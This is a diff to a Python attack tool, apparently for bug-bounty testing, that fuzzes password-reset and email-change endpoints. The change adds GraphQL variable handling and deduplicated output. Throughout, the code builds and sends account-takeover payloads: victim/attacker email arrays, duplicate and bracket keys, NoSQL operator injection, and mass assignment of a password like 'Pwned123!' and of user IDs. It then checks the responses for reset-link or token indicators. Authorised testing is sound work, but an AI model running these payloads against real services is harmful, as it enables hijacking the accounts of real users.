@@ -312,6 +312,36 @@ def body_transformation(url, human, parsed_req, baseline, interact, email, proxy
         print(f"  {Colors.YELLOW}[!] Could not identify email parameter name{Colors.RESET}")
         return
 
+    # GraphQL: email may be nested inside variables{} instead of at top level
+    _gql_mode = False
+    _gql_outer = None
+    if current_ct == "json":
+        try:
+            _tmp = json.loads(body)
+            if (isinstance(_tmp, dict) and param_mail not in _tmp
+                    and "variables" in _tmp
+                    and isinstance(_tmp.get("variables"), dict)
+                    and param_mail in _tmp["variables"]):
+                _gql_mode = True
+                _gql_outer = _tmp
+        except Exception:
+            pass
+
+    def _gql_working():
+        """Return a mutable copy of the dict level that contains param_mail."""
+        if _gql_mode:
+            return dict(_gql_outer.get("variables", {}))
+        try:
+            return json.loads(body)
+        except Exception:
+            return {}
+
+    def _gql_dump(working_dict):
+        """Rebuild the full JSON body string from the working dict."""
+        if _gql_mode:
+            return json.dumps({**_gql_outer, "variables": working_dict})
+        return json.dumps(working_dict)
+
     payloads = []
 
     # ─── 1. Content-Type switching ───────────────────────────────────────────
@@ -351,18 +381,14 @@ def body_transformation(url, human, parsed_req, baseline, interact, email, proxy
     if current_ct == "json":
         try:
             data = json.loads(body)
-            if isinstance(data, dict) and param_mail in data:
-                data_arr = data.copy()
-                data_arr[param_mail] = [victim_email, email]
-                payloads.append((json.dumps(data_arr), headers, f"JSON array → [\"{victim_email}\",\"{email}\"]"))
-
-                data_arr_rev = data.copy()
-                data_arr_rev[param_mail] = [email, victim_email]
-                payloads.append((json.dumps(data_arr_rev), headers, f"JSON array reversed → [\"{email}\",\"{victim_email}\"]"))
-
-                data_arr_single = data.copy()
-                data_arr_single[param_mail] = [email]
-                payloads.append((json.dumps(data_arr_single), headers, f"JSON array single → [\"{email}\"]"))
+            wdata = _gql_working()
+            if isinstance(data, dict) and param_mail in wdata:
+                w = wdata.copy(); w[param_mail] = [victim_email, email]
+                payloads.append((_gql_dump(w), headers, f"JSON array → [\"{victim_email}\",\"{email}\"]"))
+                w2 = wdata.copy(); w2[param_mail] = [email, victim_email]
+                payloads.append((_gql_dump(w2), headers, f"JSON array reversed → [\"{email}\",\"{victim_email}\"]"))
+                w3 = wdata.copy(); w3[param_mail] = [email]
+                payloads.append((_gql_dump(w3), headers, f"JSON array single → [\"{email}\"]"))
         except:
             pass
 
@@ -390,7 +416,8 @@ def body_transformation(url, human, parsed_req, baseline, interact, email, proxy
     if current_ct == "json":
         try:
             data = json.loads(body)
-            if isinstance(data, dict) and param_mail in data:
+            wdata = _gql_working()
+            if isinstance(data, dict) and param_mail in wdata:
                 juggle_values = [
                     (True, "bool-true"),
                     (False, "bool-false"),
@@ -403,10 +430,10 @@ def body_transformation(url, human, parsed_req, baseline, interact, email, proxy
                     ({"$gt": ""}, "nosql-gt"),
                     ({"$regex": ".*"}, "nosql-regex"),
                 ]
-                for val, desc in juggle_values:
-                    data_j = data.copy()
-                    data_j[param_mail] = val
-                    payloads.append((json.dumps(data_j), headers, f"type-juggle → {param_mail}={desc}"))
+                for val, jdesc in juggle_values:
+                    w = wdata.copy()
+                    w[param_mail] = val
+                    payloads.append((_gql_dump(w), headers, f"type-juggle → {param_mail}={jdesc}"))
         except:
             pass
 
@@ -416,10 +443,10 @@ def body_transformation(url, human, parsed_req, baseline, interact, email, proxy
             data = json.loads(body)
             if isinstance(data, dict):
                 wrappers = ["user", "account", "member", "profile", "data", "params", "attributes"]
-                for w in wrappers:
-                    merged = data.copy()
-                    merged[w] = {param_mail: email}
-                    payloads.append((json.dumps(merged), headers, f"mass-assign → {w}.{param_mail}={email}"))
+                for w_name in wrappers:
+                    wd = _gql_working()
+                    wd[w_name] = {param_mail: email}
+                    payloads.append((_gql_dump(wd), headers, f"mass-assign → {w_name}.{param_mail}={email}"))
 
                 extra_fields = [
                     ("password", "Pwned123!", "inject-password"),
@@ -432,11 +459,12 @@ def body_transformation(url, human, parsed_req, baseline, interact, email, proxy
                     ("user_id", 1, "inject-user_id"),
                     ("id", 1, "inject-id"),
                 ]
-                for field, val, desc in extra_fields:
-                    if field not in data:
-                        data_extra = data.copy()
-                        data_extra[field] = val
-                        payloads.append((json.dumps(data_extra), headers, f"mass-assign → {desc}"))
+                ref = _gql_working()
+                for field, val, fdesc in extra_fields:
+                    if field not in ref:
+                        wd = ref.copy()
+                        wd[field] = val
+                        payloads.append((_gql_dump(wd), headers, f"mass-assign → {fdesc}"))
         except:
             pass
 
@@ -444,19 +472,26 @@ def body_transformation(url, human, parsed_req, baseline, interact, email, proxy
     if current_ct == "json":
         try:
             data = json.loads(body)
-            if isinstance(data, dict) and param_mail in data:
+            wdata = _gql_working()
+            if isinstance(data, dict) and param_mail in wdata:
                 parts = []
-                for k, v in data.items():
+                for k, v in wdata.items():
                     parts.append(f'"{k}":{json.dumps(v)}')
                 parts.append(f'"{param_mail}":{json.dumps(email)}')
-                dupe_body = "{" + ",".join(parts) + "}"
-                payloads.append((dupe_body, headers, f"dupe-key → {param_mail}={victim_email} then {param_mail}={email}"))
+                inner = "{" + ",".join(parts) + "}"
 
                 parts2 = [f'"{param_mail}":{json.dumps(email)}']
-                for k, v in data.items():
+                for k, v in wdata.items():
                     parts2.append(f'"{k}":{json.dumps(v)}')
-                dupe_body2 = "{" + ",".join(parts2) + "}"
-                payloads.append((dupe_body2, headers, f"dupe-key → {param_mail}={email} then {param_mail}={victim_email}"))
+                inner2 = "{" + ",".join(parts2) + "}"
+
+                if _gql_mode:
+                    pfx = "".join(f'"{k}":{json.dumps(v)},' for k, v in _gql_outer.items() if k != "variables")
+                    payloads.append(("{" + pfx + '"variables":' + inner + "}", headers, f"dupe-key → {param_mail}={victim_email} then {param_mail}={email}"))
+                    payloads.append(("{" + pfx + '"variables":' + inner2 + "}", headers, f"dupe-key → {param_mail}={email} then {param_mail}={victim_email}"))
+                else:
+                    payloads.append((inner, headers, f"dupe-key → {param_mail}={victim_email} then {param_mail}={email}"))
+                    payloads.append((inner2, headers, f"dupe-key → {param_mail}={email} then {param_mail}={victim_email}"))
         except:
             pass
 
@@ -541,9 +576,9 @@ def body_transformation(url, human, parsed_req, baseline, interact, email, proxy
         for varied_email in email_variations:
             if current_ct == "json":
                 try:
-                    data = json.loads(body)
-                    data[param_mail] = varied_email
-                    payloads.append((json.dumps(data), headers, varied_email))
+                    wd = _gql_working()
+                    wd[param_mail] = varied_email
+                    payloads.append((_gql_dump(wd), headers, varied_email))
                 except:
                     pass
             elif current_ct == "form":
@@ -564,9 +599,9 @@ def body_transformation(url, human, parsed_req, baseline, interact, email, proxy
                 continue
             if current_ct == "json":
                 try:
-                    data = json.loads(body)
-                    data[alt_name] = email
-                    payloads.append((json.dumps(data), headers, f"{alt_name}={email}"))
+                    wd = _gql_working()
+                    wd[alt_name] = email
+                    payloads.append((_gql_dump(wd), headers, f"{alt_name}={email}"))
                 except:
                     pass
             elif current_ct == "form":
@@ -577,33 +612,24 @@ def body_transformation(url, human, parsed_req, baseline, interact, email, proxy
     if current_ct == "json":
         try:
             data = json.loads(body)
-            if isinstance(data, dict) and param_mail in data:
+            wdata = _gql_working()
+            if isinstance(data, dict) and param_mail in wdata:
                 bracket_key = f"{param_mail}[]"
 
-                d = data.copy()
-                del d[param_mail]
-                d[bracket_key] = email
-                payloads.append((json.dumps(d), headers, f"bracket-key → {bracket_key}={email}"))
+                d = wdata.copy(); del d[param_mail]; d[bracket_key] = email
+                payloads.append((_gql_dump(d), headers, f"bracket-key → {bracket_key}={email}"))
 
-                d2 = data.copy()
-                del d2[param_mail]
-                d2[bracket_key] = [victim_email, email]
-                payloads.append((json.dumps(d2), headers, f"bracket-key array → {bracket_key}=[victim,attacker]"))
+                d2 = wdata.copy(); del d2[param_mail]; d2[bracket_key] = [victim_email, email]
+                payloads.append((_gql_dump(d2), headers, f"bracket-key array → {bracket_key}=[victim,attacker]"))
 
-                d2r = data.copy()
-                del d2r[param_mail]
-                d2r[bracket_key] = [email, victim_email]
-                payloads.append((json.dumps(d2r), headers, f"bracket-key array reversed → {bracket_key}=[attacker,victim]"))
+                d2r = wdata.copy(); del d2r[param_mail]; d2r[bracket_key] = [email, victim_email]
+                payloads.append((_gql_dump(d2r), headers, f"bracket-key array reversed → {bracket_key}=[attacker,victim]"))
 
-                d3 = data.copy()
-                d3[bracket_key] = email
-                payloads.append((json.dumps(d3), headers, f"both email + email[] → {bracket_key}={email}"))
+                d3 = wdata.copy(); d3[bracket_key] = email
+                payloads.append((_gql_dump(d3), headers, f"both email + email[] → {bracket_key}={email}"))
 
-                d4 = data.copy()
-                del d4[param_mail]
-                d4[bracket_key] = victim_email
-                d4[param_mail] = email
-                payloads.append((json.dumps(d4), headers, f"both email[] + email → {param_mail}={email}"))
+                d4 = wdata.copy(); del d4[param_mail]; d4[bracket_key] = victim_email; d4[param_mail] = email
+                payloads.append((_gql_dump(d4), headers, f"both email[] + email → {param_mail}={email}"))
         except:
             pass
 
@@ -648,13 +674,12 @@ def body_transformation(url, human, parsed_req, baseline, interact, email, proxy
         if current_ct == "json":
             try:
                 data = json.loads(body)
-                if isinstance(data, dict) and param_mail in data:
-                    d = data.copy()
-                    d[param_mail] = composed
-                    payloads.append((json.dumps(d), headers, f"composite-{sep_name} → victim{sep}attacker"))
-                    d_rev = data.copy()
-                    d_rev[param_mail] = composed_rev
-                    payloads.append((json.dumps(d_rev), headers, f"composite-{sep_name} → attacker{sep}victim"))
+                wdata = _gql_working()
+                if isinstance(data, dict) and param_mail in wdata:
+                    d = wdata.copy(); d[param_mail] = composed
+                    payloads.append((_gql_dump(d), headers, f"composite-{sep_name} → victim{sep}attacker"))
+                    d_rev = wdata.copy(); d_rev[param_mail] = composed_rev
+                    payloads.append((_gql_dump(d_rev), headers, f"composite-{sep_name} → attacker{sep}victim"))
             except:
                 pass
         elif current_ct == "form":
@@ -668,9 +693,11 @@ def body_transformation(url, human, parsed_req, baseline, interact, email, proxy
                 pass
 
     # ─── Send standard payloads ──────────────────────────────────────────────
+    _bt_findings: dict = {}
+    _bt_positive = []
+
     for p_body, p_headers, desc in payloads:
-        body_display = p_body
-        payload_tag = f"{body_display}"
+        body_short = p_body[:100] + ("..." if len(p_body) > 100 else "")
 
         try:
             human_time(human)
@@ -680,26 +707,40 @@ def body_transformation(url, human, parsed_req, baseline, interact, email, proxy
                 timeout=10, proxies=proxies,
             )
 
+            _tags = []
             if resp.status_code != baseline['status'] and resp.status_code not in [400, 403]:
-                print(f"{Colors.YELLOW}   └── [STATUS {resp.status_code} ≠ BASELINE {baseline['status']}] {Colors.RESET}| PAYLOAD: {payload_tag}")
-
-            if abs(len(resp.text) - baseline['body_length']) > 50:
-                print(f"{Colors.YELLOW}   └── [LENGTH {len(resp.text)}b ≠ BASELINE {baseline['body_length']}b] {Colors.RESET}| PAYLOAD: {payload_tag}")
+                _tags.append(f"{baseline['status']} > {resp.status_code}")
+            if abs(len(resp.text) - baseline['body_length']) > 50 and resp.status_code not in [400, 403]:
+                _tags.append(f"{baseline['body_length']}b > {len(resp.text)}b")
+            if _tags:
+                _bt_findings.setdefault(" | ".join(_tags), []).append(desc)
 
             if email in resp.text:
-                print(f"{Colors.GREEN}   └── [+] {email} reflected in body | {payload_tag}{Colors.RESET}")
+                _bt_positive.append(f"[+] {email} reflected in body → {desc}")
             if email in str(resp.headers):
-                print(f"{Colors.GREEN}   └── [+] {email} reflected in headers | {payload_tag}{Colors.RESET}")
+                _bt_positive.append(f"[+] {email} reflected in headers → {desc}")
 
             resp_lower = resp.text.lower()
             success_indicators = ["success", "email sent", "password reset", "reset link", "check your email", "token"]
             for indicator in success_indicators:
                 if indicator in resp_lower and resp.status_code in (200, 201, 202, 204):
-                    print(f"{Colors.GREEN}   └── [+] success indicator '{indicator}' in response | {payload_tag}{Colors.RESET}")
+                    _bt_positive.append(f"[+] '{indicator}' → {desc} | {body_short}")
                     break
 
         except requests.RequestException as e:
             print(f"  {Colors.RED}[!] request error ({desc}): {e}{Colors.RESET}")
+
+    _DEDUP = 3
+    for tag, descs in _bt_findings.items():
+        if len(descs) >= _DEDUP:
+            print(f"{Colors.YELLOW}   └── [{tag}] ×{len(descs)} | first: {descs[0]}{Colors.RESET}")
+        else:
+            for d in descs:
+                print(f"{Colors.YELLOW}   └── [{tag}] | {d}{Colors.RESET}")
+    for pf in _bt_positive:
+        print(f"{Colors.GREEN}   └── {pf}{Colors.RESET}")
+    if not _bt_findings and not _bt_positive:
+        print(f"  {Colors.CYAN}[~] No structural anomalies — server returns consistent response for all payload variants{Colors.RESET}")
 
     # ─── 10. HTTP Parameter Pollution URL <-> Body ───────────────────────────
     hpp_cases = []
@@ -744,8 +785,9 @@ def body_transformation(url, human, parsed_req, baseline, interact, email, proxy
         pass
 
     for p_body, p_headers, p_uri, desc in hpp_cases:
-        body_display = p_body
-        payload_tag = f"URI={p_uri} | {body_display}"
+        qs_short = ("..." + p_uri[-80:]) if len(p_uri) > 83 else p_uri
+        body_short = p_body[:80] + ("..." if len(p_body) > 80 else "")
+        payload_tag = f"[{desc}] {qs_short}"
         try:
             human_time(human)
             resp = requests.request(
@@ -755,18 +797,19 @@ def body_transformation(url, human, parsed_req, baseline, interact, email, proxy
             )
 
             if resp.status_code != baseline['status'] and resp.status_code not in [400, 403]:
-                print(f"{Colors.YELLOW}   └── [STATUS {resp.status_code} ≠ BASELINE {baseline['status']}] {Colors.RESET}| PAYLOAD: {payload_tag}")
-            if abs(len(resp.text) - baseline['body_length']) > 50:
-                print(f"{Colors.YELLOW}   └── [LENGTH {len(resp.text)}b ≠ BASELINE {baseline['body_length']}b] {Colors.RESET}| PAYLOAD: {payload_tag}")
+                print(f"{Colors.YELLOW}   └── [{baseline['status']} > {resp.status_code}] | PAYLOAD: {payload_tag}")
+            if abs(len(resp.text) - baseline['body_length']) > 50 and resp.status_code not in [400, 403]:
+                print(f"{Colors.YELLOW}   └── [{baseline['body_length']}b > {len(resp.text)}b] | PAYLOAD: {payload_tag}")
             if email in resp.text:
-                print(f"{Colors.GREEN}   └── [+] {email} reflected in body {Colors.RESET}| PAYLOAD: {payload_tag}")
+                print(f"{Colors.GREEN}   └── [+] {email} reflected in body | PAYLOAD: {payload_tag}{Colors.RESET}")
             if email in str(resp.headers):
-                print(f"{Colors.GREEN}   └── [+] {email} reflected in headers {Colors.RESET}| PAYLOAD: {payload_tag}")
+                print(f"{Colors.GREEN}   └── [+] {email} reflected in headers | PAYLOAD: {payload_tag}{Colors.RESET}")
 
             resp_lower = resp.text.lower()
             for indicator in ["success", "email sent", "password reset", "reset link", "check your email", "token"]:
                 if indicator in resp_lower and resp.status_code in (200, 201, 202, 204):
-                    print(f"{Colors.GREEN}   └── [+] success indicator '{indicator}' in response {Colors.RESET}| PAYLOAD: {payload_tag}")
+                    print(f"{Colors.GREEN}   └── [+] '{indicator}' → {desc}{Colors.RESET}")
+                    print(f"{Colors.GREEN}       {qs_short}{Colors.RESET}")
                     break
 
         except requests.RequestException as e:
@@ -831,24 +874,34 @@ def data_pollution(url, human, parsed_req, baseline, interact, email, proxy=None
             f"%3B{email}",
         ]
         if re.search(EMAIL_REGEX, body, re.IGNORECASE):
+            _dp_findings: dict = {}
             for ep in email_payloads:
                 human_time(human)
                 body_injected = inject_into_email_param(body, ep)
-                body_display = body_injected
-                payload_tag = f"PAYLOAD: {ep} | BODY: {body_display}"
                 try:
                     resp_bi = requests.request(
                         method=method, url=uri, headers=headers,
                         data=body_injected, verify=False, allow_redirects=False,
                         timeout=10, proxies=proxies,
                     )
+                    _tags = []
                     if resp_bi.status_code != baseline['status'] and resp_bi.status_code not in [400, 403]:
-                        print(f"{Colors.YELLOW}   └── [STATUS {resp_bi.status_code} ≠ BASELINE {baseline['status']}] {Colors.RESET}| PAYLOAD: {payload_tag}")
-                    if abs(len(resp_bi.text) - baseline['body_length']) > 50:
-                        print(f"{Colors.YELLOW}   └── [LENGTH {len(resp_bi.text)}b ≠ BASELINE {baseline['body_length']}b] {Colors.RESET}| PAYLOAD: {payload_tag}")
-
+                        _tags.append(f"{baseline['status']} > {resp_bi.status_code}")
+                    if abs(len(resp_bi.text) - baseline['body_length']) > 50 and resp_bi.status_code not in [400, 403]:
+                        _tags.append(f"{baseline['body_length']}b > {len(resp_bi.text)}b")
+                    if _tags:
+                        _dp_findings.setdefault(" | ".join(_tags), []).append(ep)
                 except requests.RequestException as e:
                     print(f"  {Colors.RED}[!] request error: {e}{Colors.RESET}")
+            _DEDUP = 3
+            for tag, _payloads in _dp_findings.items():
+                if len(_payloads) >= _DEDUP:
+                    print(f"{Colors.YELLOW}   └── [{tag}] ×{len(_payloads)} | first: {_payloads[0]}{Colors.RESET}")
+                else:
+                    for p in _payloads:
+                        print(f"{Colors.YELLOW}   └── [{tag}] | PAYLOAD: {p}{Colors.RESET}")
+            if not _dp_findings:
+                print(f"  {Colors.CYAN}[~] No anomalies — server returns consistent response for all payloads{Colors.RESET}")
 
 
 def parameters_pollution(url, human, parsed_req, baseline, interact, email, proxy=None):
